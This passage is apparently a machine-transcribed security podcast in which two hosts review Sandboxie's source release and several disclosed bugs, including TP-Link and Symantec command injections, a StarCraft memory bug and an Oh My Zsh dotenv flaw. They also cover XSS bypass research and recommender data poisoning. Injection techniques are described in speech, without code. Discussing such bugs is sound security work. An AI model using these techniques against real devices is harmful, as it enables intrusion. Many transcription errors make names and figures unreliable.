\"start\": 2007.1}, {\"speaker\": 2, \"line\": \" to reactionary. I think part of the reason\", \"start\": 2009.6}, {\"speaker\": 1, \"line\": \" that it kind of a lot of people are upset about it is they directly said it would address Community concerns and the fact that it didn't it's like it just shows how to attach they are. Okay. Yeah.\", \"start\": 2012.4}, {\"speaker\": 2, \"line\": \" It's like they're out of touch with the right of touch. Yeah. What the actual\", \"start\": 2021.9}, {\"speaker\": 1, \"line\": \" Community wants? Yeah. That being said I think we'll move on to sandboxie sandbox. He went open source. So sandboxie is it's very old software if you are using computers and like the 2000 to 2010 Range, you've probably heard of it or use it at some point and it's basically sandbox and software to allow you to run programs inside of the container environment. It was very popular on forms and stuff like that that I was on because people were downloading tools and they wanted to be on the safe side. So they download sandboxie and run those tools in that.\", \"start\": 2025.5}, {\"speaker\": 2, \"line\": \" And I mean sandboxie was it's a file system sandbox terms of what it does. It's basically like it doesn't right out here file system. It'll right at everything that the program tries to do it. All right out kind of an overlay that's in place over the file system. That way you delete the overlay. It's all it's all gone. We talked about sandboxie when this was first announced that they'd be open sourcing it. That was episode 17. So we did talk about back then. This is now finally the source code is actually available now. Yes, the big news looks like we've used. I think there's a GitHub link.\", \"start\": 2058.6}, {\"speaker\": 1, \"line\": \" There is an official GitHub mirror. But\", \"start\": 2099.8}, {\"speaker\": 2, \"line\": \" oh that was just somebody that put it on there\", \"start\": 2102.3}, {\"speaker\": 1, \"line\": \" God. Yeah exactly. That's not their official one. And what's really weird is if you go to their official download page for the source, you have to fill out a form for US Government export compliance. It's like super weird. I've never heard of export compliance being needed for downloading source code. I can't see this being an actual thing that the government would enforce or else. Why would they not do I'm like that with Beatrice release. I mean, yeah, just I don't know.\", \"start\": 2104.4}, {\"speaker\": 2, \"line\": \" I mean, the only thing I can think of is, you\", \"start\": 2130.3}, {\"speaker\": 1, \"line\": \" know crypto something with crypto. But it's a sandboxing system.\", \"start\": 2132.4}, {\"speaker\": 2, \"line\": \" Yeah, I don't know where I would be used that. I'm just saying. The only thing I could think of is something with crypto. Yeah, I will mention also, like I think the source code will be interesting to look at to see how it handled it. But I mean as you know, now your browser is already kind of I mean people would run their browser and now browsers have a lot stronger sandboxes now just in terms of how they sound box content and escaping those is usually through, you know, some sort of Kernel code execution usually trying to ask like getting system privileges and I'm going to assume you know, That box you could also be escaped through that same explains.\", \"start\": 2138.2}, {\"speaker\": 1, \"line\": \" So I don't see the problem easier.\", \"start\": 2180.3}, {\"speaker\": 2, \"line\": \" Yeah, potentially or maybe not because it's something exotic that the attackers won't be thinking of but security groups already. Yeah Raisa, but I mean, I'll just say like, I mean it's not as useful anymore, which is probably why they've decided to open source. It was a paid program or like an egg where I think it was so they're doing something with it putting the source out. Like I can applaud that like, you know, they're they're done with it off loading the application by just putting the source out and letting people do with it what they want. I think that would be interesting obviously now you like what you could do with that you need a sign drivers. So I mean, most people don't have Signing certificates for that. Yeah,\", \"start\": 2183.3}, {\"speaker\": 1, \"line\": \" I think even though sandbox. He has been made kind of irrelevant by the built-in sandbox as you were talking about. I think studying the source code could be very interesting as like a learning exercise or just you know, learning a little bit more about how sandboxing works and the overlay FS or overlay file system stuff could be ported to other projects as well.\", \"start\": 2229.7}, {\"speaker\": 2, \"line\": \" Yeah, they're Geoff keighley users. Like I like I said, I'm definitely glad that they're putting it out there not just hiding it away. Hey now that they're done with it. Yeah,\", \"start\": 2248.8}, {\"speaker\": 1, \"line\": \" so the source is out there. You can check out that GitHub page that zi was looking at earlier. It is The Unofficial mirror, but at the same time like nobody's going to want to fill out a US export compliance form. So just just go to the you know, the mirror pages and you know, you can look through the source code there as far as I know. I think it's all in like C and C++. So, you know, you're going to need to know have a foundation and that to be able to read the But for people who are interested in that it's there. That being said though. I think we can move on to some exploits unless you have anything any final thoughts in sandbox on okay, so getting into some exploits. Our first one is from zi zi and it's a zi post about a command injection found in pain to own Tokyo from November 20 19. It was run one from Team flashback who is hitting the tp-link routers. We actually talked about pwned. Oh and a little bit on the podcast and we probably you know mention the This Be Tails of this team and this attack but this\", \"start\": 2258.5}, {\"speaker\": 2, \"line\": \" yeah, we usually don't get all the technical details until afterwards if we even get them. Yeah just said needs to be patched it again. Yeah. Yeah.\", \"start\": 2319.0}, {\"speaker\": 1, \"line\": \" Oh, this is 40 DB server Damon for the tp-link A7 routers which apparently runs mips. I didn't know routers ran MEPS. I thought midst was mostly dead. But you know, that's kind of interesting. I thought you know because most routers are probably running like a I'm right\", \"start\": 2329.7}, {\"speaker\": 2, \"line\": \" though arms. Definitely more popular. But yeah, I don't really know what the distribution is at all when it comes to type Computing.\", \"start\": 2346.7}, {\"speaker\": 1, \"line\": \" Yeah, so this Damon seems to be for Bridging the Gap between their mobile app and the router which I think is their tp-link tether app. It could possibly also be for like the technicians who come in you'll notice sometimes they'll have iPads with proprietary apps for interfacing with the router and stuff like that, but it could just be or that tp-link tether app as well. If\", \"start\": 2356.4}, {\"speaker\": 2, \"line\": \" it was imagine. It's more likely towards that tp-link tether or some other consumer. I use just because of they seem to do the reverse engineering through just like looking at the packets. So unless they had access to the proprietary tooling I would assume that they use the normal mobile application that's available for consumers to see this.\", \"start\": 2377.2}, {\"speaker\": 1, \"line\": \" Yeah, you're probably right. So one of these packet types that you were mentioning that they were reversing can trigger a the one mesh service which ends up parsing a Json payload. Load that you give to it which contains like credentials and stuff like that. So the MAC address for the slave device is one of them and that Mac address is copied to the stack and is then copied into a command buffer through sprintf, which gets passed to system though. You can kind of see their you know, they go into more detail about all this trucks involved and all the functions of passes through but basically what it ends up boiling down to is the MAC address gets copied into a buffer that's then passed to system or concatenated into a buffer that's\", \"start\": 2403.3}, {\"speaker\": 2, \"line\": \" Well, so it's placed placed into it. So it's placed into some lieu of code actually which ends up being called by System. But otherwise, you hit the key point there. It sends an encrypted blob of data that uses static encryption key that that's where the Jason's contained within it talks about something that talks about like their custom checksum method not entirely relevant to here as you said what's relevant though is it sends that Json object that could see Crabs that slave underscore Mac puts it into a variable and then here pulling up the coat relevant code. They'll see the s printf that as the system command had has that lieu of for matched. Well has the format string for the Mac equals and then for the Mac will go call system on it. So it's kind of in the middle fed. And that does come into play with how they actually solve this. But so when I say solve this one of the problems that they came up with is this looks like it would be a really straightforward. Command injection. It's calling system. You control some of the data going in there straightforward. The problem is that they're limited to about 12 bytes at a time because you know the size of a Mack itself plus their actual Escape so you can escape this as long as it's not doing a validation on the Mac, which it's not you can escape that with just the quotient semicolon, which is effectively what they do. They do the single quote to get out of the luau. Bat her to get off the Lua code semicolon and then whatever their payload is and then they'll kind of recreate the string. Basically, they'll come the last single quote is so the extra characters that are appended don't invalidate the command itself or don't kind of cause any issues with that. So they get appended onto the end which is so coming back to this. They basically had 12 characters, which is not a lot for a command injection.\", \"start\": 2444.0}, {\"speaker\": 1, \"line\": \" And it's almost like a CTF like\", \"start\": 2570.7}, {\"speaker\": 2, \"line\": \" restriction. Yeah, I was thinking like this could be a fun little challenge or maybe I've even done a challenge like this probably but yeah, they're so their solution there though is, you know, print def whatever character appended to another file which comes out in their example here printf a to file zi. Yeah print er, sorry building up the file one character at a time that requires 11 bite still one character. And then they show how I try to do a character that gets interpreted by the shell. You can't just do that with the printf without quotes. You need a quote. Whatever that character is. So you can you don't have enough bites left actually append. Do you have to create a new file that he then do a cat\", \"start\": 2572.5}, {\"speaker\": 1, \"line\": \" with? To upend it. I thought it was a pretty clever solution. I liked it.\", \"start\": 2621.2}, {\"speaker\": 2, \"line\": \" Yeah, it sucks. So tonight. Like it wasn't what I was expecting with the zi zi right up, but definitely fun to read and I mean I'd recommend just if you just taking a look at how that was done because I know just hearing me say it probably doesn't quite make sense. But the gist of it is they build up their payload one character at a time and for some characters they had to take extra steps.\", \"start\": 2627.9}, {\"speaker\": 1, \"line\": \" There were some like funny crypto fails, I guess to the fact that they were all like the packets were all encrypted with a fixed key is like kind of a problem in itself, but they also had some other weird stuff. They used a really bad initialization Vector. If you saw it, it was like ABC or one two, three, four, five, six, seven eight nine ABCDEFG or something like that. It was like really bad and then they also\", \"start\": 2653.1}, {\"speaker\": 2, \"line\": \" seem fine to me.\", \"start\": 2677.1}, {\"speaker\": 1, \"line\": \" I don't and they here. And they used aes-128 even though they had a 256-bit key and IV so there was some funny like crypto like weird stuff happening there. But you know, so there's that too in there if anybody wants to look at that. But yeah overall I think just the approach of how they, you know handle some of those roadblocks. I think the issue itself isn't too interesting but you know how they kind of got around the Roblox and stuff was was what was more value in the post and was pretty fun. Yeah. I mean, I just worked with trivia. Class on how it can be made Harder by the restrictions.\", \"start\": 2679.3}, {\"speaker\": 2, \"line\": \" Yeah. I mean it's made harder definitely not impossible not knots like I mean, I feel like if you were to go and Google like sure to RC or Shore command injection. He'd probably come with some similar things too. Like I'm definitely not going to say this is a novel vector or novel method, but at the same time looks a way it's still interesting read and the fact that this is a poem to own. And they did get a $5,000 Bounty for this.\", \"start\": 2714.1}, {\"speaker\": 1, \"line\": \" I saw 20,000.\", \"start\": 2743.4}, {\"speaker\": 2, \"line\": \" I think that was kind of the entire thing. This is just\", \"start\": 2745.0}, {\"speaker\": 1, \"line\": \" once I think I think okay when I read it it said they got 50,000 total but 20,000 for this bug. So maybe I misread\", \"start\": 2748.4}, {\"speaker\": 2, \"line\": \" it. Yeah. Well so up here at the top it mentions that which are them $5,000. Oh, this could have who's the\", \"start\": 2755.2}, {\"speaker\": 1, \"line\": \" cookie results? And it said,\", \"start\": 2762.6}, {\"speaker\": 2, \"line\": \" yeah, so they mentioned here use the command injection vulnerability as part of the exploit chain. Use the game code execution on tp-link Archer. So I assume there's maybe like an escalation or something after this that they\", \"start\": 2764.2}, {\"speaker\": 1, \"line\": \" also the full chain is\", \"start\": 2776.2}, {\"speaker\": 2, \"line\": \" 20,000. That would be my guess. I mean it does just say they use this to gain code execution and in theory if they have this they've got code execution already. Yeah, but yeah, my guess is probably some sort of escalation or something from there. This is just part of it.\", \"start\": 2777.9}, {\"speaker\": 1, \"line\": \" Yeah, it's pretty interesting. But yeah, I'd recommend reading that just for seeing how they you know solve that the problems are\", \"start\": 2797.2}, {\"speaker\": 2, \"line\": \" and yeah, you could largely I think Skip towards where that comes up. Like don't get me wrong. The background is always good. But if you're just interested in that part like you don't really need to know a ton of the background\", \"start\": 2804.1}, {\"speaker\": 1, \"line\": \" here. Yeah, so we love game exploits just because there there's so much fun. You're combining exploits and games and finally, we have one after a little while and it's in Starcraft 1 Starcraft the one from 1998. Apparently, it was remastered and released in 2017. The bug is fairly old. It was originally patched and 1.13 in January of 2006, but it ended up resurfacing because in the remaster and 1.21 they introduce Andy. The emulator which basically reintroduced the bug and the reason it's called the EU debug is EU d stands for extended unit death and it was it was basically a parser bug in the map scripts that allowed relative read write and basically arbitrary right if you factor in where it's you know reading and writing to her sir bug or\", \"start\": 2816.2}, {\"speaker\": 2, \"line\": \" just like the one value just wasn't validated so when it would access an array, so it was a death counter. So you had these death counters that would track like Like how the player which player and how many of each type of unit, they killed or destroyed or whatever. I haven't played Starcraft. So I apologize if I keep some wrong terms of but essentially you had that it would use just that unit type wasn't getting validate. So check the player ID. But Unity, you could basically provide any value into this actor. I guess. It's also important to mention that part of this comes down to the maps kind of supporting some scripting so people can Had their own story or introduce new game modes, and that's where people are able to set up and some actions that happen in response to things like in response some of the deaths. So in this case, I'll see if you can control one element of the array like what one index you're able to get to access anywhere in that array. Or certainly any we're kind of in memory if you're able to control that array index.\", \"start\": 2868.2}, {\"speaker\": 1, \"line\": \" Yes, so abounds\", \"start\": 2934.9}, {\"speaker\": 2, \"line\": \" access. Yeah, so you're able to get to increment or compare values except you're basically this is a specter already mentioned a reader. I get it anywhere to memory. No way SL are either on this so nothing really to deal with their there was an axe to be fair, but that's about all the security\", \"start\": 2936.1}, {\"speaker\": 1, \"line\": \" there might have been a SLR but the game wasn't compiled this position independent. So, you know, it doesn't really matter and that's not too much of a surprise. I mean the game is pretty old. So I was I'd probably be surprised if it was position independent, but what I thought was cool about this too was he actually ended up turning this bug into a CTF challenge for the Midnight Sun qualifiers that happened this year. So, you know, it's one of those things you can see like a game exploit and those are those are decently common to try to pour it into cpf challenges just because it's kind of a a unique area. It's not explored to too much. You don't see too much about it. So and it's more fun. I think to exploit games is kind of you know, brings two things together that makes it a lot more fun.\", \"start\": 2954.7}, {\"speaker\": 2, \"line\": \" Yeah, although usually like getting into position to do that as also a bit more of a challenge with the game challenges. Yeah, which I kind of find a little bit more annoying rather than just focusing on the bug, but that's just me.\", \"start\": 3001.3}, {\"speaker\": 1, \"line\": \" Yeah, I do have a bit of a question though near the end. They said that the bug was exposed in a safe Manner and I'm not really sure what they mean by that. They said old fussed old fun custom maps can be played again without exposing yourself to memory corruption attacks, and I don't really see how that's the case because if the bug survived then how is it like a safe manner or how would you not be exposing yourself to memory corruption? If this is a memory corruption issue, I'm not really sure what they meant by that and I'm not sure. Sure, if you\", \"start\": 3015.7}, {\"speaker\": 2, \"line\": \" kind of know, I'm not soccer.\", \"start\": 3046.5}, {\"speaker\": 1, \"line\": \" It's kind of weird the way they worded that I'm not sure what they were going for their butt. It was just kind of a weird thing. I noticed at the end, but overall, you know,\", \"start\": 3049.3}, {\"speaker\": 2, \"line\": \" maybe limiting where the buck can actually hit. Yeah, exactly can't override the stack with it or something as they do for\", \"start\": 3058.7}, {\"speaker\": 1, \"line\": \" wrong. Yeah could be\", \"start\": 3066.8}, {\"speaker\": 2, \"line\": \" something like though. I mean, it feels like that's just kind of like that cat and mouse game like there's probably a way around it.\", \"start\": 3069.1}, {\"speaker\": 1, \"line\": \" Exactly. So yeah seems kind of weird that we're the way they worded it, but overall I think the host was was really good and you know, it's fun to see those kinds of attacks and instead of you know, the more serious ones. We always cover but getting back into some, you know, more serious ones we have. Oh my Zetas H, which is a DOT end remote code execution and it's basically due to falsely trusting environment. Variables in the dot end plug in or not environment variables but environment files. So what ends up happening is when you see D into a project directory this plug-in will end up sourcing any environment files that finds in the directory and this it does this without prompting or notifying the user or anything.\", \"start\": 3075.7}, {\"speaker\": 2, \"line\": \" So, I believe there's a malicious. It's not\", \"start\": 3116.8}, {\"speaker\": 1, \"line\": \" just code execution through that.\", \"start\": 3119.1}, {\"speaker\": 2, \"line\": \" It's not just any it's specifically the dot in be file not just like any environment file it Typically the dot e MV file okay in that project. So that's like you would set up your dot e and B file for your project automatically when it goes in there CDN, it just runs Source Dottie and be for you and away it goes generally helpful. You don't have to remember to do that all the time yourself that said so our study and be like are just using Source the command source. Actually executes the file not just loads environment variables. So if you have a malicious one that has codon and not just environment variables. It'll execute code and will do that automatically. So definitely a concern and I definitely like a lot of people would be using this to because it is useful. I don't use that shell or zi shell or whichever it is. But I do know this is quite popular, especially. Oh, my zi shell is quite popular.\", \"start\": 3120.8}, {\"speaker\": 1, \"line\": \" I think I've used it before I don't use it all the time use that it's like yeah\", \"start\": 3188.9}, {\"speaker\": 2, \"line\": \" same.\", \"start\": 3193.3}, {\"speaker\": 1, \"line\": \" So the fixed basically was just to prompt the user to make sure you want a source that environment file when you see the end of the directory before just you know, executing it automatically in the background kind of thing. It's an interesting issue is not one you see too often, but it is like a fairly it's a very accessible issue. It's not to understand, you know, yeah, I mean, you know his file without letting you know or asking you about\", \"start\": 3196.3}, {\"speaker\": 2, \"line\": \" it. I will mention if I don't really like the fix here the prompt Kind of seems useless\", \"start\": 3218.4}, {\"speaker\": 1, \"line\": \" I can see why you'd say that.\", \"start\": 3227.9}, {\"speaker\": 2, \"line\": \" Yeah, I mean not useless but excessive at\", \"start\": 3229.3}, {\"speaker\": 1, \"line\": \" least. I mean, maybe it should just I don't know my thought was maybe\", \"start\": 3232.0}, {\"speaker\": 2, \"line\": \" tofu, you know like Trust on first use prompt once and then use that is another thing. I was kind of think was maybe some sort of priests can like only look for very restrictive thing. Like if every line is simply alpha numeric equals alpha numeric. No symbols. Besides that equal sign something like that, then it could trust that. Although I don't really like that kind of for the same reason I've mentioned before with the cat and mouse is there's probably going to be some way around that. Anyhow, somebody will figure out some some fun CTF like response to it. I don't really like the\", \"start\": 3240.0}, {\"speaker\": 1, \"line\": \" priest has something for\", \"start\": 3279.2}, {\"speaker\": 2, \"line\": \" example Well, I don't know. I'm just saying. Somebody can probably find some way around even if it is really restrictive. Yeah for sure.\", \"start\": 3280.6}, {\"speaker\": 1, \"line\": \" Yeah, the one the one way I was thinking you could do that as you can just modify the path file 2.2 like a directory you control and you know kind of like I think there was an issue we talked about last episode that did something like that. They modified the path to prioritize a malicious binary over a usual one just because yeah, but use absolute paths, for example, yes, so you\", \"start\": 3292.2}, {\"speaker\": 2, \"line\": \" probably won't have a check there to make sure they're not setting path. Yeah, for example, so yeah, I think tofu though would be a Fair compromise because the compromise they came up with a zika basically disable the prompt if you get annoyed by it. So I mean I'd say you know that because this is one of those cases where people are going to be prompted by that quite a bit or potentially could be so the prompts going to get annoying. It's not going to serve its purpose. It's technically there but it's not going to serve the purpose that was set out for so that's where I think you know, if they prompted just on the first use of it. And then trusted it after that. I think that would be a fair way to go about it.\", \"start\": 3312.7}, {\"speaker\": 1, \"line\": \" Yeah, like that's a good point from chat pone. The Gibson said max are is zi sh bit of default now, which yeah, actually I completely forgot about that but you're right. I remember the last time I know it's been a little while but the last time I went on my back I noticed that too it is that Ice Age so good. That's a good point. Thanks for bringing that up. But yeah, you know kind of a kind of a short little write-up. It's not a overly complex. Issue, but it does exist. So one of them bring up what we'll get into semantic web Gateway. So there was a white paper on packet Storm from Cody 16 and it's a nicely laid out paper that has sections on some environment information bug information. I kind of like how it was laid out and it's part of a miniseries. He's doing called hunting 0 days, which is it's kind of like a journal of real-world 0 days that he's came across and how he found them and whatnot. It sounds like an interesting concept. This one covers in are seeing the semantic web Gateway the you know, kind of stipulation of that is it can only be hit by authorized user? So the impact is pretty limited there. Well, that'd but at the\", \"start\": 3360.1}, {\"speaker\": 2, \"line\": \" same time. I mean, you've got a web interface you don't expect them to have code execution, especially when we're talking about like this some that's going to be used by Like I believe that some that would be used more on like the Enterprise level and not something that's super consumer-focused. Hmm. So in that case like they're going to want to have more protection like it's still something we're untrusted people may not have full access but it still kind of\", \"start\": 3424.7}, {\"speaker\": 1, \"line\": \" matters. It's still a privilege\", \"start\": 3452.1}, {\"speaker\": 2, \"line\": \" escalation. Yeah, I mean granted the type of person who I has this level of access probably has access just on the server itself, but\", \"start\": 3453.9}, {\"speaker\": 1, \"line\": \" I mean you will be able to track down anybody who exploits this most likely just by you know, checking access logs and stuff like that. But anyway getting into the issue it's basically a command injection that was found through the ntp server field in the configuration settings you search through the web root of the Gateway did a grep and found that the ntp server name post variable was just being added right in the middle of the string passed to egg Sac with no validation. So very like the most straightforward. Word command injection, you can get basically we've got a lot of command injections on this show. I just realize if you know, it's that's like our vulnerability class of the week. But anyway, you know, you can basically just use that to get a shell issue fairly straightforward, but I think it's cool that the guys trying to give some insight into the process, you know saying about like, you know, this is why I did this, you know, we always like to show those out just because those\", \"start\": 3464.7}, {\"speaker\": 2, \"line\": \" dead included the full\", \"start\": 3518.9}, {\"speaker\": 1, \"line\": \" process. Yeah, exactly. The impact is limited because you do need need an authorized user to pull it off. But like you were saying, you know, it is still a privilege privilege escalation and that Insight could be helpful. So one of the give it a bit of the Shadow\", \"start\": 3520.8}, {\"speaker\": 2, \"line\": \" our last, yang actually I will just mention. Yeah now with that just for those of you listening. It's literally as easy as just injecting a semicolon and putting in whatever command you want to run. That's all you need to do for the injection. Just for those feed listening who can't see how stupidly simple or how simple this issue is.\", \"start\": 3537.2}, {\"speaker\": 1, \"line\": \" Yeah. So our last exploit we don't have too much information on it's a VMware security advisory. It's it's an improved disclosure and the VMware directory service. We don't have technical details, but there is a bit of weirdness around it because it has a cdss three score of ten and nine point eight on the cve which Very high for what your typical information disclosure would be.\", \"start\": 3561.6}, {\"speaker\": 2, \"line\": \" Yeah, so we might\", \"start\": 3586.6}, {\"speaker\": 1, \"line\": \" usually isn't just a memory leak that can use to you know, well so that I don't\", \"start\": 3587.2}, {\"speaker\": 2, \"line\": \" think this is in memory leak at all. I don't think it's that type of information disclosure. I think this is more likely disclosing some sort of token or even credentials that are used for communication between different services. That would be my guess just because it is a 10 point O or 9.8. Looking at the CV itself your CIA our confidentiality integrity and availability. They're all rated High usually with information disclosure. It's just information. So it's just confidentiality. Maybe maybe medium may be high, but you won't be able to impact Integrity or availability of the service. So the fact that that's all being changed their makes me think. Some sort of authentication or authorization information information that could directly be used to modify everything else which they kind of mention. It's highly sensitive information which could be used to compromise the vcenter server or other services which are dependent upon the Ender for authentication. So, yeah, we don't have the details on it, but I figured I'd one called out because I'm sure some of you are. It's using VMware and also just because we it is a little bit weird to see an information disclosure with such a high\", \"start\": 3591.7}, {\"speaker\": 1, \"line\": \" rating. Yeah, it may be worth patch to thing for anyone interested in doing that kind of stuff. I don't think\", \"start\": 3675.4}, {\"speaker\": 2, \"line\": \" we want to really but\", \"start\": 3681.5}, {\"speaker\": 1, \"line\": \" you know, if you want to see what the actual issue wasn't get technical details could be a fun exercise to do some patch nothing on it\", \"start\": 3682.9}, {\"speaker\": 2, \"line\": \" or there could be a lot of things in there. I don't know how much cells weapon patch the same time.\", \"start\": 3688.5}, {\"speaker\": 1, \"line\": \" Yeah, I don't know that. Yeah, I'm not too familiar with VMware and like how they roll out updates and stuff. So let that's it your point but you know, it could be something that somebody might be interested in doing we'll move into some research though. Our first one is on bypassing modern xss mitigations with code reuse attacks, which is kind of cool. I haven't really heard of code reviews being used in a web context. Apparently. It's been a while around for a while since 2017 according to the article which is something fairly recent. And\", \"start\": 3694.3}, {\"speaker\": 2, \"line\": \" I'm 2017 to still pretty recent one comes to research. I mean, yeah, it was actually kind of new to me. Also, I mean technically so you've already matched this isn't new but at the same time it's a little bit different from my usual approach when dealing with CSP. It's usually looking for some weakness in the CSP header itself that lets you, you know inject something like defines what object or how you're going to get your code in there. Just some weakness. that whereas this Dimension is kind of about code reuse the idea of finding gadgets and existing libraries and reusing those in your injection to get around like if you have a CSP policy, you know restricted to only sell for something you'd find some Gadget or how to find Gadgets in. In the libraries that are already being used and reusing those for yourself. Like it's an interesting attack or interesting method. Yeah.\", \"start\": 3724.7}, {\"speaker\": 1, \"line\": \" I liked how they had some examples. They have an example of like an HTML page that sets a HTML element with a get parameter and shows how like the see it the CSP could be bypass. Their first example is a little bit contrived but it's something like if the page has a calculator you can use the Expression in that to inject existing page content somewhere else. At that excess us.\", \"start\": 3784.4}, {\"speaker\": 2, \"line\": \" Yeah, they do that. Obviously, they move right on from talking about that really simple case to using jQuery mobile. Yes, you include that library and you're able and the kind of they show a gadget from if you go to the 2017 paper, which they link they include kind of more information about some different gadgets and other\", \"start\": 3807.1}, {\"speaker\": 1, \"line\": \" libraries. But if you look they also they have like some examples of like the gadgets the types of gadgets you could use to bypass CSP and web application firewalls and stuff like that. So they mention let me just go to it so I can\", \"start\": 3827.7}, {\"speaker\": 2, \"line\": \" yeah, well search string manipulation Gadget element construction function creation JavaScript execution sync gadgets and gadgets and expression\", \"start\": 3845.4}, {\"speaker\": 1, \"line\": \" parsers. Yeah, so, you know, they they gave that real-world. But I thought this was really cool because when you hear code reuse you always think binary and this kind of makes you rethink that that hey you could use that in the web context as well and it absolutely makes sense and it brings kind of that new way of thinking to web which I always thought. I've always found web a little bit boring because it always seems like okay copy and paste from a cheat sheet if it works. Okay, cool. If it doesn't move on to something else, that's how I've kind of seen web for a while. But this kind of challenge is that thinking this Is this is bringing some of that binary thought process into web which I thought was like really cool and and it was new to me as well. Like obviously, you know, 2017 is when it was introduced, but it was new to me and I think it you said earlier to is new to you as well.\", \"start\": 3854.8}, {\"speaker\": 2, \"line\": \" So yeah, so I think it actually like 2017 was first paper on it. I think you can trace this back a little bit further. I couldn't give you dates on it. I think the paper actually gives credit to another source though also. Oh God,\", \"start\": 3903.6}, {\"speaker\": 1, \"line\": \" but you know, I think it's still like very it's We not very well known I think maybe we\", \"start\": 3917.4}, {\"speaker\": 2, \"line\": \" know that's why I didn't want to\", \"start\": 3922.9}, {\"speaker\": 1, \"line\": \" tax in the future.\", \"start\": 3924.9}, {\"speaker\": 2, \"line\": \" I think part of it though is I mean csps have been you know, just increasing in adoption. They haven't been well used in the past. No or well supported by the browsers either like so that's where I could see this kind of coming up to be more useful to be thinking about this kind of going forward and having some systems that will maybe remove gadgets from your code\", \"start\": 3926.2}, {\"speaker\": 1, \"line\": \" automatically. Yeah.\", \"start\": 3949.0}, {\"speaker\": 2, \"line\": \" But yeah, it was definitely kind of like you get the concept like as soon as you say by passing modern excess mitigations with code reuse text. Like when you mention excess and code reuse like you get you kind of get the initial idea of what they're doing. Hmm, the paper goes into more detail while finding actual gadgets. But yeah, it's not something I've needed to do before or really looked at before so it was new to me.\", \"start\": 3953.1}, {\"speaker\": 1, \"line\": \" One thing. I will touch on there as you were saying csb hasn't In much adoption, but where I think it's cool to is this can bypass more than just CSP you can use this to bypass web application firewalls. Like they were saying and I think those had seen an like increase adoption. I think web application firewalls are like pretty popular now aren't they? Like they've picked up a lot of adoption over the last five years haven't they?\", \"start\": 3979.5}, {\"speaker\": 2, \"line\": \" um I kind of like through cloudflare through some of the CDN offerings. Yes.\", \"start\": 4002.3}, {\"speaker\": 1, \"line\": \" So, you know, it could be useful for getting around those and that that could also be spurring on potentially seeing more of these the style of attack being used in the future. So, you know, maybe we'll see it in CTS to maybe give you the first but yeah, not too much more to say on that.\", \"start\": 4012.9}, {\"speaker\": 2, \"line\": \" Yeah. Well on the CTF note, I was actually looking at extending your excessive alert challenge with CSP.\", \"start\": 4029.3}, {\"speaker\": 1, \"line\": \" Oh, that could be\", \"start\": 4038.8}, {\"speaker\": 2, \"line\": \" fun. I was looking at that and then I realized that even though you have the includes for the jQuery stuff. You don't actually include the file so they can't get\", \"start\": 4039.3}, {\"speaker\": 1, \"line\": \" loaded. Ha ha look at that secure. I challenge that secure but ya know that could be cool. What do you think like modifying the initial Challenger making\", \"start\": 4047.1}, {\"speaker\": 2, \"line\": \" it I want well so my initial thought was to do it. Like I did with the prng wind where it doesn't fix the version. Yeah. Okay. That's why I was looking at updating your accessible loved one and making a fixed or less success of\", \"start\": 4058.1}, {\"speaker\": 1, \"line\": \" alerts. Hey, that could be fun. I think that's a good idea. But with that we'll move on to Our next research topic. So our next one is practical data poisoning attacks against next item recommendation though. This paper proposes a system called Loki guessing, you know, the god of tricks and or Norse mythology. That's probably where they came up with the name because I couldn't find it doesn't seem to be an acronym and it's you know, the system is being proposed for doing data poisoning attacks against black box recommendation systems and what I mean by recommendation systems is you know, Shopping sites, for example where they recommend items to you based on reviews and purchase history and you know the example they go through with is Amazon basically and their system is going to use machine learning to train the attack agent and how they do that is by using a simulator to get around the restrictions you'd have with typical real-world recommendation systems. So they basically run a simulator with a data set. So the example they use is like the Amazon beauty product section. They take like a bunch. Those and and basically make a simulator for that recommendation system and then they try to poison that system which uses a history of like the users actions and stuff like that certain interests and make connections between them and the key paragraph that summarizes what they're doing for some reason I forgot to write down the page number. So I don't know if you could search this one I'm talking about it, but they say the intuition behind such a design is that if to recommend recommenders can both get similar recommendation results and it Given data set the adversarial samples generated for one of the recommended recommenders can be used to attack the other so to pull off this attack. They assumed the attacker can see the full history of all the users in the system. They assume they can inject a limited number of controlled users and that they're hitting a black box system and at the attacker can only receive minimal feedback. They can't see for example, when the Target Model is retrained for testing this they tested against like the Amazon Beauty. It's like I was talking about\", \"start\": 4072.8}, {\"speaker\": 2, \"line\": \" before I do want to jump in and just mention I do feel like one of those things the access to the full activity user of all our sorry full activity history of all users in the recommendation list at is a high condition. That seems like a really high condition everything else seems like they're taking as like what can somebody outside do you know, the limited number of control users not knowing the details limited feedback that one just seems so out of place for everything else like not knowing the details. Tales about the target system, but they know the full activity history.\", \"start\": 4199.1}, {\"speaker\": 1, \"line\": \" It does kind of go against her black box approach.\", \"start\": 4232.3}, {\"speaker\": 2, \"line\": \" Yeah, like everything else seems okay, just that one. Like I'm not sure if maybe I was just a misunderstanding how they were using that or something. But that one really stood out\", \"start\": 4235.1}, {\"speaker\": 1, \"line\": \" to me. Yeah. Yeah. It's a bit weird. But you know when they did their testing they ended up seeing that they could force a display rate of up to 0.5 at 15 activities per user and those are fairly decent results. I mean 50% is quite a lot if you're hitting something. Like Amazon, for example, so, you know, it's kind of interesting hitting like recommendation systems and using machine learning, you know, kind of using AI to attack Ai and a way I think that's kind of cool. But like you were saying that is a good point though that you know, that is a very high conditional consider is considering their whole methodology behind the paper as being able to hit Black Box system though. Yeah. That is that is a bit weird.\", \"start\": 4244.8}, {\"speaker\": 2, \"line\": \" Yeah. That's why I wasn't sure if maybe I was misunderstanding and they only I need like the full history of their controlled subjects or something like that. But it like it does say\", \"start\": 4288.7}, {\"speaker\": 1, \"line\": \" all users of all users. Yeah. So, you know, that's a good point overall though. I thought the paper was kind of interesting. So, you know, one of the bring up our next paper though, I think is far more interesting and it's on the defense side and it's about Hardware Trojan detection using controlled circuit aging so how they propose to do that is basically using transistor aging to try to detect Hardware back doors and Trojans. So this paper is pretty technical it gets into the hardware level, but essentially what they're proposing is that when the voltage of a Sir goes from high to low. It causes short-term Aging in that transistor and when this happens the current that goes through it is reduced which causes a switching delay which delays timings and causes timing errors in the integrated circuits. And what they do is use machine learning to try to learn the bit error patterns produced from a known clean. I see and then they do the same thing against a potentially malicious I see and compare the results.\", \"start\": 4298.8}, {\"speaker\": 2, \"line\": \" Well, so I mean maybe I was just distracted for a moment. Mr. But one of the big things is With the Aging that they're using both the Aging result are some sir. Did you mention the Aging aspect?\", \"start\": 4356.3}, {\"speaker\": 1, \"line\": \" I mentioned the Aging aspect. I didn't go too far in depth with it. That's\", \"start\": 4372.2}, {\"speaker\": 2, \"line\": \" okay. Well, I don't want to go too far in depth with that. I was just going to make mention of effectively they find a way to artificially aged 